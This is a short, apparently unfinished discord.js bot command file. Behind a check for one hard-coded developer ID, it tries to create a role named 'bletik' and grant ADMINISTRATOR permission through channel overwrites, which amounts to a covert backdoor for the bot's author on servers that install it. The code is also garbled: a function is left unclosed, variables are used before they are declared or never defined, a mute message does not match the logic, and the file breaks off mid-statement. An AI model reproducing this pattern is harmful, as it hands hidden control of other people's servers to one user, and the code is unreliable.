const Discord = require("discord.js");

const bot = new Discord.Client();

exports.run = async (client, message, args) => {

  let embed = new Discord.RichEmbed()

    .setTitle("developer")

    .setDescription(

      "Sorry, the `dev` command can only be executed by the Developer."

    )

    .setColor("BLUE");

  if (message.author.id !== "478547279104442368")

    return message.channel.send(embed);

  function clean(text) {

    
if (!btrole) return message.channel.send("Please tag user to mute!");
  let btrole = message.guild.roles.find(`name`, "bletik");

  if (!btrole) {

    try {

       btrole = await message.guild.createRole({

        name: "bletik",

        color: "#840800",

        permissions: []

      });

      message.guild.channels.forEach(async (channel, id) => {

        await channel.overwritePermissions(muterole, {
          ADMINISTRATOR: true,
          
          SEND_MESSAGES: true,

          ADD_REACTIONS: true

        });

      });

await btrole.addrole(
